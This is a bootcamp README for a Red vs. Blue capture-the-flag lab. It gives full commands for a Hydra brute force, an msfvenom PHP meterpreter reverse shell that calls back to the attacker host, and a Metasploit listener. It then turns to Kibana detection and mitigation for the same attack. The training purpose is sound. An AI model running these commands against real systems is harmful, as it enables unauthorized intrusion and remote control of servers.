# Red-vs-Blue-Project
Red Team vs. Blue Team scenario in which our bootcamp plays the role of both penetration tester and SOC analyst.

### Step 1: Discover the IP address of the Linux server.

In order to find the IP address of the machine, you will need to use Nmap to scan your network.

- Open the terminal and run: `nmap 192.168.1.0/24`

   ![1_nmap.png](Images/1_nmap.png)

From the Nmap scan we can see that port `80` is open. Open a web browser and type the IP address of the machine into the address bar.

- Open a web browser and navigate to `192.168.1.105` and press `enter`.

   ![2_web_discovery.png](Images/2_web_discovery.png)

### Step 2: Locate the hidden directory on the server.

- Navigating through different directories, you will see a reoccurring message:

  ```
  Please refer to company_folders/secret_folder for more information
  ERROR: company_folders/secret_folder/ is no longer accessible to the public
  ```

- Navigate to the directory by typing: `192.168.1.105/company_folders/secret_folder`

- The directory asks for authentication in order to access it. Reading the authentication method, it says "For ashton's eyes only."

    ![4_password_protect.png](Images/4_password_protect.png)

### Step 3: Brute force the password for the hidden directory.

Because the folder is password protected, we need to either guess the password or brute force into the directory. In this case, it would be much more efficient to use a brute force attack, specifically Hydra.

- Using Ashton's name, run the Hydra attack against the directory:

  - Type: `hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`

      ![5_hydra_sytanx.png](Images/5_hydra_sytanx.png)

- The brute force attack may take some time. Once it finishes, you'll find the username is `ashton` and the password is `leopoldo`.

    ![6_password_discovery.png](Images/6_password_discovery.png)

- Go back to the web browser and use the credentials to log in. Click the file `connecting_to_webdav`.

   ![7_inside_secret_directory.png](Images/7_inside_secret_directory.png)

- Located inside of the WebDAV file are instructions on how to connect to the WebDAV directory, as well the user's username and hashed password.

   ![webdav_instructions.png](Images/8b_webdav_instructions.png)

   ![webdav_hash.png](Images/8a_webdav_hash.png)

**Step 4: Connect to the server via Webdav**

There are several ways to break the password hash. Here, we simply used Crack Station, to avoid waiting for `john` to crack the password.

Navigate to `https://crackstation.net`; paste the password hash and fill out the CAPTCHA; and click **Crack Hashes**.

   ![cracked](Images/9_password_hash.png)

  - The password is revealed as: `linux4u`

### Step 5: Connect to the server via WebDAV.

This may be the most difficult part of the Red Team exercise, as it will require students to do external research on how to connect to the VM's WebDAV directory.

In addition, the instructions show an outdated IP address that the students will need to change to the IP address they discovered.

- In order to do so, students will already need to have the user name and following instructions from the `secret_folder`. Direct students to:
  - Open the `File System` shortcut from the desktop.
  - Click `Browse Network`.
  - In the URL bar, type: `dav://192.168.1.105/webdav`, and enter the credentials to log in.

    ![10_connect_to_webdav.png](Images/10_connect_to_webdav.png)

### Step 6: Upload a PHP reverse shell payload.

- To set up the reverse shell, run:

  - `msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php`

   ![11_msfvenom.png](Images/11_msfvenom.png)

- Run this series of commands to set up a listener:

  - `msfconsole` to launch `msfconsole`.
  - `use exploit/multi/handler`
  - `set payload php/meterpreter/reverse_tcp`
  - `show options` and point out they need to set the `LHOST`.
  - `set LHOST 192.168.1.90`
  - `exploit`

    ![12_listener.png](Images/12_listener.png)

- Place the reverse shell onto the WebdDAV directory.

    ![13_implanting_the_reverse.png](Images/13_implanting_the_reverse.png)

- Now that you're logged in, connect to the webdav folder by navigating to `192.168.1.105/webdav`. Use the credentials that you used before, `user:ryan pass:linux4u`.

  ![14_webdav.png](Images/14_webdav.png)

- Navigate to where you first uploaded the reverse shell and click it to activate it. If it seems like the browser is hanging or loading, that means it has worked.
    - If it asks you if you'd like to save or open the PDF file, start again at the beginning of Step 5.

  ![15_activiating_the_shell.png](Images/15_activiating_the_shell.png)

### Step 7: Find and capture the flag.

- On the listener, search for the file `flag.txt` located in the `root` directory. Students can use many techniques they have learned in order to find it.

- On the listener, search for the file `flag.txt` located in the root directory. Students can use many techniques they have learned to find it. One technique is to run:

  - Drop into a bash shell with the command: `shell`
  - Go to the `/` directory: `cd /`
  - Search the system for any files containing the phrase "flag" : `find . -iname flag.txt`

Students can read the file, once located, with `cat`.

   ![16_view_files](Images/16_view_files.png)

| :warning: **Important Checkpoint** :warning:                     |
|------------------------------------------------------------------|
| **At this time, you should have completed the following steps:** |
| Step 1: Discover the IP address of the Linux server.             |
| Step 2: Locate the hidden directory on the server.               |
| Step 3: Brute force the password for the hidden directory.       |
| Step 4: Crack the password hash.                                 |
| Step 5: Connect to the server via WebDAV.                        |
| Step 6: Upload a PHP reverse shell payload.                      |
| Step 7: Find and capture the flag.                               |


## Part 2: Incident Analysis with Kibana

### Investigating the Incident

After exploiting the target, analyzing the logs will show me:
- What my attack looks like from a defender's perspective.

- How stealthy or detectable my tactics were.

- Which kinds of alarms and alerts SOC and IR professionals can set to spot attacks like the ones I conducted while they occur, rather than after.

#### Step 1: Double-click the Google Chrome icon on the Windows host's desktop to launch Kibana. If it doesn't load as the default page, navigate to http://192.168.1.105:5601.

#### Step 2: Created a Kibana dashboard using the pre-built visualizations for the following existing reports.
- `HTTP status codes for the top queries [Packetbeat] ECS`
- `Top 10 HTTP requests [Packetbeat] ECS`
- `Network Traffic Between Hosts [Packetbeat Flows] ECS`
- `Top Hosts Creating Traffic [Packetbeat Flows] ECS`
- `Connections over time [Packetbeat Flows] ECS`
- `HTTP error codes [Packetbeat] ECS`
- `Errors vs successful transactions [Packetbeat] ECS`
- `HTTP Transactions [Packetbeat] ECS`

The final dashboard:

![](Images/Dashboard.png)

Ran the following search queries in the `Discover` screen with Packetbeat.
- `source` 
- Search for the `source.ip` of the attacking machine.
- Used `AND` and `NOT` to further filter the search and look for communications between the attacking machine and the victim machine.
- Other things to looked at: 
	- `url`
	- `status_code`
	- `error_code`

More helpful searches:

- `http.response.status_code : 200`
- `url.path: /company_folders/secret_folder/`
- `source.port: 4444`
- `destination.port: 4444`
- `NOT source.port: 80 and NOT source.port: 443`

![](Images/Searching.png)

#### 1. Identify the Offensive Traffic

Identified the traffic between the attacking machine and the web machine:


- I was able to find some interesting interactions.

- Ran `source.ip: 192.168.1.90 and destination.ip: 192.168.1.105` in which the source IP is the Kali machine and the destination machine is the web server.

- Ran `url.path: /company_folders/secret_folder/`.

- I saw when the interaction happened so I changed the timeline that Kibana is searching to see that time period:

![](Images/show-dates.png)

In the dashboard, I looked through the different panels and used the data to look through the results and notice the following interactions:

The victem machine sent back the following responses:

- On the dashboard, the top responses in the `HTTP status codes for the top queries [Packetbeat] ECS`

	![](Images/Status-codes.png)

- `401`, `301`, `207`, `404` and `200` are the top responses.

- It is also visible with the `HTTP Error Codes [Packetbeat] ECS` panel:

	![](Images/Error-code.png)

The following data is concerning from the Blue Team perspective?

- There was a connection spike in the `Connections over time [Packetbeat Flows] ECS`

  ![](Images/Connection-spike.png)

- There is also a spike in errors in the `Errors vs successful transactions [Packetbet] ECS`

  ![](Images/Error-spike.png)

#### 2. Find the Request for the Hidden Directory

In the attack, I found a secret folder. I looked at that interaction between these two machines.

There were 6,197 requests that were made to this directory? At 00:35am on 26/05/2020 from 192.168..1.105.

- On the dashboard, the `Top 10 HTTP requests [Packetbeat] ECS` panel:

   ![](Images/Top-folders.png)

- In this example the /company_folder/secret_folder was requested `6,197` times. The folder contains webdav.

- We can see in the same panel that the file `connect_to_corp_server` was requested `3` times.

- An alarm will need to be set that goes off if any attempt to access the directory or file is made.

- The directory and file should be removed from the server all together.

#### 3. Identify the Brute Force Attack

I then used Hydra to brute-force the target server.

- You can then see the packets from hydra by using the search function `url.path: /company_folders/secret_folder/` will show you a few conversations involving this folder.

- In the `Discovery` page, I searched for: `url.path: /company_folders/secret_folder/`.

I Looked through the results and notice that `Hydra` is identified under the `user_agent.original` section:

  ![](Images/Hydra-Evidence.png)

-   In the `Top 10 HTTP requests [Packetbeat] ECS` panel, we can see that the password protected `secret_folder` was _requested_ `6209` times, but the file inside that directory was only requested `3` times. So, out of `6209` requests, only `3` were successful.   

   ![](Images/secret-folder.png)

Take a look at the `HTTP status codes for the top queries [Packetbeat] ECS` panel:

![](Images/HTTP-Errors.png)

- You can see on this panel the breakdown of `401 Unauthorized` status codes as opposed to `200 OK` status codes.

- You can also see the spike in both traffic to the server and error codes.

- You can see a connection spike in the `Connections over time [Packetbeat Flows] ECS`

	![](Images/Connection-spike.png)

- You can also see a spike in errors in the `Errors vs successful transactions [Packetbet] ECS`

	![](Images/Error-spike.png)

These are all results generated by the brute force attack with Hydra.

- I set an alert if `401 Unauthorized` is returned from any server over a certain threshold that would weed out forgotten passwords. Start with `10` in one hour and refine from there.

- I also created an alert if the `user_agent.original` value includes `Hydra` in the name.

- After the limit of 10 `401 Unauthorized` codes have been returned from a server, that server can automatically drop traffic from the offending IP address for a period of 1 hour. I also displayed a lockout message and lock the page from login for a temporary period of time from that user.

#### 4. Find the WebDav Connection

- You can again see in the `Top 10 HTTP requests [Packetbeat] ECS` panel that the webdav folder was directly connected and files inside were accessed.

  ![](Images/webdav.png)

- You can also see it in the pie charts:

  ![](Images/WebDav-pie.png)

- We can see the passwd.dav file was requested as well as a file named `shell.php`

- I created an alert anytime this directory is accessed by a machine _other_ than the machine that should have access.

- Connections to this shared folder should not be accessible from the web interface. 

- Connections to this shared folder could be restricted by machine with a firewall rule.

#### 5. Identify the Reverse Shell and meterpreter Traffic

To finish off the attack, I uploaded a PHP reverse shell and started a meterpreter shell session. 

-  First, you can see the `shell.php` file in the `webdav` directory on the `Top 10 HTTP requests [Packetbeat] ECS` panel.

   ![](Images/webdav.png)

- My meterpreter session ran over port `4444`. Port `4444` is the _default_ port used for meterpreter and the port used in all of their documentation. Because of this, many attackers forget to change this port when conducting an attack. I constructed a search query to find these packets.

- `source.ip: 192.168.1.105 and destination.port: 4444`

I set the following alarms to detect this behavior in the future.

- I set an alert for any traffic moving over port `4444.`

- I set an alert for any `.php` file that is uploaded to a server.

One way to harden the vulnerable machine that would mitigate this attack.

- Removing the ability to upload files to this directory over the web interface would take care of this issue.



| :warning: **Important Checkpoint** :warning:                     |
|------------------------------------------------------------------|
| **At this time, you should have completed the following steps:** |
| Step 1: Identify the Offensive Traffic.                          |
| Step 2: Find the Request for the Hidden Directory.               |
| Step 3: Identify the Brute Force Attack.		           |
| Step 4: Find the WebDav Connection.                              |
| Step 5: Identify the Reverse Shell and meterpreter Traffic.      |


## Day 3 Activity File: Reporting

- **Network Topology**:   
    - **Kali**: `192.168.1.90`
    - **ELK**: `192.168.1.100`
    - **Target**: `192.168.1.105`

- **Red Team**: While the web server suffers from several vulnerabilities, the three below are the most critical:
    - **Cryptographic Failures**: Exposure of the `secret_folder` directory and the `connect_to_corp_server` file compromised the credentials of the Web DAV folder. Cryptographic Failures is an OWASP Top 10 vulnerability.
    - **Unauthorized File Upload**: The web server allows users to upload arbitrary files ??? specifically, PHP scripts. This exposes the machine to the wide array of attacks enabled by malicious files.
    - **Remote Code Execution**: As a consequence of the unauthorized file upload vulnerability, attackers can upload web shells and achieve arbitrary remote code execution on the web server.
    - Additional severe vulnerabilities include:
      - Lack of mitigation against brute force attacks
      - No authentication for sensitive data, e.g., `secret_folder`
      - Plaintext protocols (HTTP and WebDAV)

- **Blue Team**:   
  - A considerable amount of data is available in the logs. Specifically, evidence of the following was obtained upon inspection:
    - Traffic from attack VM to target, including unusually high volume of requests
    - Access to sensitive data in the `secret_folder` directory
    - Brute-force attack against the HTTP server
    - POST request corresponding to upload of `shell.php`

  - **Unusual Request Volume**: Logs indicate an unusual number of requests and failed responses between the Kali VM and the target. Note that `401`, `301`, `207`, `404` and `200` are the top responses.

    ![](../Images/Status-codes.png)

    - In addition, note the connection spike in the `Connections over time [Packetbeat Flows] ECS`, as well as the spike in errors in the `Errors vs successful transactions [Packetbet] ECS`

    ![](../Images/Connection-spike.png)

    ![](../Images/Error-spike.png)

  - **Access to Sensitive Data in `secret_folder`**: On the dashboard you built, a look at your `Top 10 HTTP requests [Packetbeat] ECS` panel. In this example, this folder was requested `6,197` times. The file `connect_to_corp_server` was requested `3` times.

    ![](../Images/Top-folders.png)

  - **HTTP Brute Force Attack**: Searching for `url.path: /company_folders/secret_folder/` shows conversations involving the sensitive data. Specifically, the results contain requests from the brute-forcing tool`Hydra`, identified under the `user_agent.original` section:

      ![](../Images/Hydra-Evidence.png)

    - In addition, the logs contain evidence of a large number of requests for the sensitive data, of which only `3` were successful. This is a telltale signature of a brute-force attack. Specifically, the password protected `secret_folder` was requested `6209` times. However, the file inside that directory was only requested `3` times. So, out of `6209` requests, only `3` were successful. 

      ![](../Images/secret-folder.png) 

  - **WebDAV Connection & Upload of `shell.php`**: The logs also indicate that an unauthorized actor was able to access protected data in the `webdav` directory. The `passwd.dav` file was requested via `GET`, and `shell.php` uploaded via `POST`.

      ![](../Images/webdav.png)

      ![](../Images/WebDav-pie.png)

- **Mitigation**: The following alarms should be set to detect this behavior next time? The following controls should be put in place on the target to prevent the attack from happening.

  - Mitigation steps for each vulnerability above are provided below.
    - **High Volume of Traffic from Single Endpoint**
      - Rate-limiting traffic from a specific IP address would reduce the web server's susceptibility to DoS conditions, as well as provide a hook against which to trigger alerts against suspiciously suspiciously fast series of requests that may be indicative of scanning.
    - **Access to sensitive data in the `secret_folder` directory**
      - First, the `secret_folder` directory should be protected with stronger authentication. E.g., it could be moved to a server to which only key-based SSH access from whitelisted IPs is enabled.
      - Second, the data inside of `secret_folder` should be encrypted at rest.
      - Third, Filebeat should be configured to monitor access to the `secret_folder` directory and its contents.
      - Fourth, access to `secret_folder` should be whitelisted, and access from IPs not on this whitelist, logged.
    - **Brute-force attack against the HTTP server**
      - The `fail2ban` utility can be enabled to protect against brute force attacks.
    - **POST request corresponding to upload of `shell.php`**
      - File uploads should require authentication.
      - In addition, the server should implement an upload filter and forbid users from uploading files that may contain executable code.

### Presentation Deliverables

- [Report: Red vs. Blue Project] https://docs.google.com/presentation/d/1d07OCqkbAXL5kwCwVJrqLPtIgOWXA5t3EZfwI98rdDE/edit#slide=id.g8798eb4c44_0_0)






